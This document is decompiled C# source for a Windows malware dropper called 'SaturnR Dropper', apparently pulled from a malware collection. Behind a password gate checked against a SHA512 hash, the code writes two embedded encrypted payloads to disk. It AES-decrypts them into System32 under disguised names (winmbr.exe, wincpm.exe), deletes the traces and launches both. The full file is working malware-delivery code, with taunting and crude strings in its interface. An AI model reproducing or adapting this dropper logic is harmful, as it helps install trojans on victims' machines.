// Decompiled with JetBrains decompiler
// Type: Detonator.Form1
// Assembly: Detonator, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FA2FF0E3-083F-4040-BA84-6329375224BC
// Assembly location: \\VBOXSVR\B4s3\ToxicDatabase-main\GDI\SaturnR\SaturnR.exe

using Detonator.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

#nullable disable
namespace Detonator;

[DesignerGenerated]
public class Form1 : Form
{
  private static List<WeakReference> __ENCList = new List<WeakReference>();
  private IContainer components;
  [AccessedThroughProperty("Button_Detonate")]
  private Panel _Button_Detonate;
  [AccessedThroughProperty("EULASwitch")]
  private Panel _EULASwitch;
  [AccessedThroughProperty("Label1")]
  private Label _Label1;
  [AccessedThroughProperty("Label2")]
  private Label _Label2;
  [AccessedThroughProperty("Label3")]
  private Label _Label3;
  [AccessedThroughProperty("Button_Close")]
  private Button _Button_Close;
  [AccessedThroughProperty("Label4")]
  private Label _Label4;
  [AccessedThroughProperty("TextBox1")]
  private TextBox _TextBox1;
  [AccessedThroughProperty("Label5")]
  private Label _Label5;
  [AccessedThroughProperty("Button1")]
  private Button _Button1;
  [AccessedThroughProperty("Button2")]
  private Button _Button2;
  private string ReadMe;
  private string CorrectHash;
  private string Checksum;
  private object EULA_Accetped;
  private int ButtonCycle;
  private bool PasswdCorrect;

  [DebuggerNonUserCode]
  static Form1()
  {
  }

  public Form1()
  {
    Form1.__ENCAddToList((object) this);
    this.ReadMe = "Welcome to my dropper. Unfortunately for you, you probably did not get the password to Saturn. And unfortunately for you, i'm not dumb enough to store the trojan unencrypted and the password in plain text. So good luck trying to bruteforce a 32 character long password hashed in SHA512. You will need it.";
    this.CorrectHash = "c8ecfe421bfaa9d603ec9a8ea96803e5497c514d206461537de77a1bff6b74df0189ce20dcb5fe80cb51a656da29af8c28b602c4216a3b79ac77baf2e088c0e1";
    this.Checksum = "";
    this.EULA_Accetped = (object) false;
    this.ButtonCycle = 1;
    this.InitializeComponent();
  }

  [DebuggerNonUserCode]
  private static void __ENCAddToList(object value)
  {
    lock (Form1.__ENCList)
    {
      if (Form1.__ENCList.Count == Form1.__ENCList.Capacity)
      {
        int index1 = 0;
        int num = checked (Form1.__ENCList.Count - 1);
        int index2 = 0;
        while (index2 <= num)
        {
          if (Form1.__ENCList[index2].IsAlive)
          {
            if (index2 != index1)
              Form1.__ENCList[index1] = Form1.__ENCList[index2];
            checked { ++index1; }
          }
          checked { ++index2; }
        }
        Form1.__ENCList.RemoveRange(index1, checked (Form1.__ENCList.Count - index1));
        Form1.__ENCList.Capacity = Form1.__ENCList.Count;
      }
      Form1.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
    }
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.components == null)
        return;
      this.components.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void InitializeComponent()
  {
    ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
    this.Button_Detonate = new Panel();
    this.EULASwitch = new Panel();
    this.Label1 = new Label();
    this.Label2 = new Label();
    this.Label3 = new Label();
    this.Button_Close = new Button();
    this.Label4 = new Label();
    this.TextBox1 = new TextBox();
    this.Label5 = new Label();
    this.Button1 = new Button();
    this.Button2 = new Button();
    this.SuspendLayout();
    this.Button_Detonate.BackColor = Color.Transparent;
    this.Button_Detonate.BackgroundImage = (Image) Detonator.My.Resources.Resources.detState1;
    Panel buttonDetonate1 = this.Button_Detonate;
    Point point1 = new Point(64 /*0x40*/, 325);
    Point point2 = point1;
    buttonDetonate1.Location = point2;
    this.Button_Detonate.Name = "Button_Detonate";
    Panel buttonDetonate2 = this.Button_Detonate;
    Size size1 = new Size(128 /*0x80*/, 128 /*0x80*/);
    Size size2 = size1;
    buttonDetonate2.Size = size2;
    this.Button_Detonate.TabIndex = 1;
    this.EULASwitch.BackColor = Color.Transparent;
    this.EULASwitch.BackgroundImage = (Image) componentResourceManager.GetObject("EULASwitch.BackgroundImage");
    this.EULASwitch.BackgroundImageLayout = ImageLayout.Stretch;
    Panel eulaSwitch1 = this.EULASwitch;
    point1 = new Point(12, 151);
    Point point3 = point1;
    eulaSwitch1.Location = point3;
    this.EULASwitch.Name = "EULASwitch";
    Panel eulaSwitch2 = this.EULASwitch;
    size1 = new Size(64 /*0x40*/, 64 /*0x40*/);
    Size size3 = size1;
    eulaSwitch2.Size = size3;
    this.EULASwitch.TabIndex = 2;
    this.Label1.AutoSize = true;
    this.Label1.BackColor = Color.Transparent;
    Label label1_1 = this.Label1;
    point1 = new Point(73, 135);
    Point point4 = point1;
    label1_1.Location = point4;
    this.Label1.Name = "Label1";
    Label label1_2 = this.Label1;
    size1 = new Size(73, 13);
    Size size4 = size1;
    label1_2.Size = size4;
    this.Label1.TabIndex = 3;
    this.Label1.Text = "No, I disagree";
    this.Label2.AutoSize = true;
    this.Label2.BackColor = Color.Transparent;
    Label label2_1 = this.Label2;
    point1 = new Point(73, 218);
    Point point5 = point1;
    label2_1.Location = point5;
    this.Label2.Name = "Label2";
    Label label2_2 = this.Label2;
    size1 = new Size(64 /*0x40*/, 13);
    Size size5 = size1;
    label2_2.Size = size5;
    this.Label2.TabIndex = 4;
    this.Label2.Text = "Yes, I agree";
    this.Label3.AutoSize = true;
    this.Label3.BackColor = Color.Transparent;
    this.Label3.ForeColor = Color.Red;
    Label label3_1 = this.Label3;
    point1 = new Point(25, 18);
    Point point6 = point1;
    label3_1.Location = point6;
    this.Label3.Name = "Label3";
    Label label3_2 = this.Label3;
    size1 = new Size(204, 130);
    Size size6 = size1;
    label3_2.Size = size6;
    this.Label3.TabIndex = 5;
    this.Label3.Text = componentResourceManager.GetString("Label3.Text");
    this.Button_Close.BackColor = Color.Red;
    this.Button_Close.FlatStyle = FlatStyle.Flat;
    this.Button_Close.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 238);
    Button buttonClose1 = this.Button_Close;
    point1 = new Point(229, -1);
    Point point7 = point1;
    buttonClose1.Location = point7;
    this.Button_Close.Name = "Button_Close";
    Button buttonClose2 = this.Button_Close;
    size1 = new Size(28, 28);
    Size size7 = size1;
    buttonClose2.Size = size7;
    this.Button_Close.TabIndex = 6;
    this.Button_Close.Text = "X";
    this.Button_Close.UseVisualStyleBackColor = false;
    this.Label4.AutoSize = true;
    this.Label4.BackColor = Color.Transparent;
    this.Label4.Font = new Font("Arial", 14.25f, FontStyle.Italic, GraphicsUnit.Point, (byte) 238);
    this.Label4.ForeColor = Color.Red;
    Label label4_1 = this.Label4;
    point1 = new Point(50, 468);
    Point point8 = point1;
    label4_1.Location = point8;
    this.Label4.Name = "Label4";
    Label label4_2 = this.Label4;
    size1 = new Size(154, 23);
    Size size8 = size1;
    label4_2.Size = size8;
    this.Label4.TabIndex = 7;
    this.Label4.Text = "RUN MALWARE";
    TextBox textBox1_1 = this.TextBox1;
    point1 = new Point(76, 488);
    Point point9 = point1;
    textBox1_1.Location = point9;
    this.TextBox1.Name = "TextBox1";
    TextBox textBox1_2 = this.TextBox1;
    size1 = new Size(176 /*0xB0*/, 20);
    Size size9 = size1;
    textBox1_2.Size = size9;
    this.TextBox1.TabIndex = 8;
    this.Label5.AutoSize = true;
    this.Label5.BackColor = Color.Transparent;
    Label label5_1 = this.Label5;
    point1 = new Point(9, 491);
    Point point10 = point1;
    label5_1.Location = point10;
    this.Label5.Name = "Label5";
    Label label5_2 = this.Label5;
    size1 = new Size(56, 13);
    Size size10 = size1;
    label5_2.Size = size10;
    this.Label5.TabIndex = 9;
    this.Label5.Text = "Password:";
    Button button1_1 = this.Button1;
    point1 = new Point(152, 247);
    Point point11 = point1;
    button1_1.Location = point11;
    this.Button1.Name = "Button1";
    Button button1_2 = this.Button1;
    size1 = new Size(77, 34);
    Size size11 = size1;
    button1_2.Size = size11;
    this.Button1.TabIndex = 10;
    this.Button1.Text = "Compute this cunt";
    this.Button1.UseVisualStyleBackColor = true;
    Button button2_1 = this.Button2;
    point1 = new Point(152, 206);
    Point point12 = point1;
    button2_1.Location = point12;
    this.Button2.Name = "Button2";
    Button button2_2 = this.Button2;
    size1 = new Size(75, 35);
    Size size12 = size1;
    button2_2.Size = size12;
    this.Button2.TabIndex = 11;
    this.Button2.Text = "Compare this cunt";
    this.Button2.UseVisualStyleBackColor = true;
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.BackgroundImage = (Image) componentResourceManager.GetObject("$this.BackgroundImage");
    size1 = new Size(256 /*0x0100*/, 512 /*0x0200*/);
    this.ClientSize = size1;
    this.Controls.Add((Control) this.Button2);
    this.Controls.Add((Control) this.Button1);
    this.Controls.Add((Control) this.Label5);
    this.Controls.Add((Control) this.TextBox1);
    this.Controls.Add((Control) this.Button_Detonate);
    this.Controls.Add((Control) this.Label4);
    this.Controls.Add((Control) this.Button_Close);
    this.Controls.Add((Control) this.Label2);
    this.Controls.Add((Control) this.Label1);
    this.Controls.Add((Control) this.EULASwitch);
    this.Controls.Add((Control) this.Label3);
    this.FormBorderStyle = FormBorderStyle.None;
    this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
    this.Name = nameof (Form1);
    this.StartPosition = FormStartPosition.CenterScreen;
    this.Text = "SaturnR Dropper";
    this.ResumeLayout(false);
    this.PerformLayout();
  }

  internal virtual Panel Button_Detonate
  {
    [DebuggerNonUserCode] get => this._Button_Detonate;
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.Button_Detonate_Click);
      MouseEventHandler mouseEventHandler1 = new MouseEventHandler(this.Button_Detonate_MouseUp);
      MouseEventHandler mouseEventHandler2 = new MouseEventHandler(this.Button_Detonate_MouseDown);
      if (this._Button_Detonate != null)
      {
        this._Button_Detonate.Click -= eventHandler;
        this._Button_Detonate.MouseUp -= mouseEventHandler1;
        this._Button_Detonate.MouseDown -= mouseEventHandler2;
      }
      this._Button_Detonate = value;
      if (this._Button_Detonate == null)
        return;
      this._Button_Detonate.Click += eventHandler;
      this._Button_Detonate.MouseUp += mouseEventHandler1;
      this._Button_Detonate.MouseDown += mouseEventHandler2;
    }
  }

  internal virtual Panel EULASwitch
  {
    [DebuggerNonUserCode] get => this._EULASwitch;
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.EULASwitch_Click);
      if (this._EULASwitch != null)
        this._EULASwitch.Click -= eventHandler;
      this._EULASwitch = value;
      if (this._EULASwitch == null)
        return;
      this._EULASwitch.Click += eventHandler;
    }
  }

  internal virtual Label Label1
  {
    [DebuggerNonUserCode] get => this._Label1;
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Label1 = value;
  }

  internal virtual Label Label2
  {
    [DebuggerNonUserCode] get => this._Label2;
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Label2 = value;
  }

  internal virtual Label Label3
  {
    [DebuggerNonUserCode] get => this._Label3;
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Label3 = value;
  }

  internal virtual Button Button_Close
  {
    [DebuggerNonUserCode] get => this._Button_Close;
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.Button1_Click);
      if (this._Button_Close != null)
        this._Button_Close.Click -= eventHandler;
      this._Button_Close = value;
      if (this._Button_Close == null)
        return;
      this._Button_Close.Click += eventHandler;
    }
  }

  internal virtual Label Label4
  {
    [DebuggerNonUserCode] get => this._Label4;
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Label4 = value;
  }

  internal virtual TextBox TextBox1
  {
    [DebuggerNonUserCode] get => this._TextBox1;
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox1 = value;
  }

  internal virtual Label Label5
  {
    [DebuggerNonUserCode] get => this._Label5;
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Label5 = value;
  }

  internal virtual Button Button1
  {
    [DebuggerNonUserCode] get => this._Button1;
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.Button1_Click_1);
      if (this._Button1 != null)
        this._Button1.Click -= eventHandler;
      this._Button1 = value;
      if (this._Button1 == null)
        return;
      this._Button1.Click += eventHandler;
    }
  }

  internal virtual Button Button2
  {
    [DebuggerNonUserCode] get => this._Button2;
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.Button2_Click);
      if (this._Button2 != null)
        this._Button2.Click -= eventHandler;
      this._Button2 = value;
      if (this._Button2 == null)
        return;
      this._Button2.Click += eventHandler;
    }
  }

  private void Button1_Click(object sender, EventArgs e) => this.Close();

  private void EULASwitch_Click(object sender, EventArgs e)
  {
    if (Conversions.ToBoolean(Operators.NotObject(this.EULA_Accetped)))
    {
      Size size;
      size.Height = 128 /*0x80*/;
      size.Width = 64 /*0x40*/;
      this.EULASwitch.Size = size;
      this.EULASwitch.BackgroundImage = (Image) Detonator.My.Resources.Resources.ToggleSwitchDn;
      this.EULA_Accetped = (object) true;
    }
    else
    {
      Size size;
      size.Height = 64 /*0x40*/;
      size.Width = 64 /*0x40*/;
      this.EULASwitch.Size = size;
      this.EULASwitch.BackgroundImage = (Image) Detonator.My.Resources.Resources.ToggleSwitchUp;
      this.EULA_Accetped = (object) false;
    }
  }

  private void Button_Detonate_Click(object sender, EventArgs e)
  {
    if (!Conversions.ToBoolean(Operators.AndObject((object) (this.ButtonCycle == 1), Operators.CompareObjectEqual(this.EULA_Accetped, (object) true, false))))
      return;
    Size size;
    size.Height = 256 /*0x0100*/;
    size.Width = 128 /*0x80*/;
    Point point;
    point.X = 64 /*0x40*/;
    point.Y = 197;
    this.Button_Detonate.Location = point;
    this.Button_Detonate.BackgroundImage = (Image) Detonator.My.Resources.Resources.detState2;
    this.Button_Detonate.Size = size;
    checked { ++this.ButtonCycle; }
  }

  private void Button_Detonate_MouseDown(object sender, MouseEventArgs e)
  {
    if (Conversions.ToBoolean(Operators.AndObject((object) (this.ButtonCycle == 2), Operators.CompareObjectEqual(this.EULA_Accetped, (object) true, false))))
    {
      this.Button_Detonate.BackgroundImage = (Image) Detonator.My.Resources.Resources.detStatePressed;
      if (Operators.CompareString(this.ComputeSHA512(this.TextBox1.Text), this.CorrectHash, false) != 0)
      {
        this.PasswdCorrect = false;
        int num = (int) Interaction.MsgBox((object) "Password Incorrect", MsgBoxStyle.Critical, (object) "SaturnR Dropper");
      }
      else
      {
        this.PasswdCorrect = true;
        int num = (int) Interaction.MsgBox((object) "Password Correct !", MsgBoxStyle.Information, (object) "SaturnR Dropper");
      }
      if (!this.PasswdCorrect)
        return;
      MyProject.Computer.FileSystem.WriteAllBytes("C:\\Gordon.aes", Detonator.My.Resources.Resources.Gordon, false);
      this.DecryptAES("C:\\Gordon.aes", this.TextBox1.Text, "C:\\Windows\\System32\\winmbr.exe");
      MyProject.Computer.FileSystem.WriteAllBytes("C:\\Saturn.aes", Detonator.My.Resources.Resources.Saturn, false);
      this.DecryptAES("C:\\Saturn.aes", this.TextBox1.Text, "C:\\Windows\\System32\\wincpm.exe");
      MyProject.Computer.FileSystem.DeleteFile("C:\\Saturn.aes");
      MyProject.Computer.FileSystem.DeleteFile("C:\\Gordon.aes");
      Process.Start("C:\\Windows\\System32\\winmbr.exe");
      Process.Start("C:\\Windows\\System32\\wincpm.exe");
    }
    else
    {
      if (!Operators.ConditionalCompareObjectEqual(this.EULA_Accetped, (object) false, false))
        return;
      int num = (int) Interaction.MsgBox((object) "You must accept the EULA in order to continue", MsgBoxStyle.Critical, (object) "SaturnR Dropper");
    }
  }

  private void Button_Detonate_MouseUp(object sender, MouseEventArgs e)
  {
    if (this.ButtonCycle != 2)
      return;
    this.Button_Detonate.BackgroundImage = (Image) Detonator.My.Resources.Resources.detState2;
  }

  private void Button1_Click_1(object sender, EventArgs e)
  {
    int num = (int) Interaction.MsgBox((object) this.ComputeSHA512(this.TextBox1.Text));
  }

  private void Button2_Click(object sender, EventArgs e)
  {
    if (Operators.CompareString(this.ComputeSHA512(this.TextBox1.Text), this.CorrectHash, false) == 0)
    {
      int num1 = (int) Interaction.MsgBox((object) "Good shit");
    }
    else
    {
      int num2 = (int) Interaction.MsgBox((object) "Bad shit");
    }
  }

  public string ComputeSHA512(string InputString)
  {
    byte[] hash = SHA512.Create().ComputeHash(Encoding.ASCII.GetBytes(InputString));
    string shA512 = (string) null;
    byte[] numArray = hash;
    int index = 0;
    while (index < numArray.Length)
    {
      byte num = numArray[index];
      shA512 += num.ToString("x2");
      checked { ++index; }
    }
    return shA512;
  }

  public bool DecryptAES(string File, string Password, string Output)
  {
    bool flag;
    try
    {
      string s1 = (string) null;
      string s2 = (string) null;
      ushort index = 0;
      while (index < (ushort) 32 /*0x20*/)
      {
        s1 += Conversions.ToString(Password[(int) index]);
        checked { ++index; }
      }
      while (index >= (ushort) 32 /*0x20*/ & index < (ushort) 48 /*0x30*/)
      {
        s2 += Conversions.ToString(Password[(int) index]);
        checked { ++index; }
      }
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      rijndaelManaged.KeySize = 256 /*0x0100*/;
      rijndaelManaged.Key = Encoding.UTF8.GetBytes(s1);
      rijndaelManaged.IV = Encoding.UTF8.GetBytes(s2);
      ICryptoTransform decryptor = rijndaelManaged.CreateDecryptor();
      using (FileStream fileStream1 = new FileStream(File, FileMode.Open, FileAccess.Read))
      {
        using (FileStream fileStream2 = new FileStream(Output, FileMode.Create, FileAccess.Write))
        {
          using (CryptoStream destination = new CryptoStream((Stream) fileStream2, decryptor, CryptoStreamMode.Write))
            fileStream1.CopyTo((Stream) destination);
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      flag = false;
      ProjectData.ClearProjectError();
      goto label_21;
    }
    flag = true;
label_21:
    return flag;
  }
}
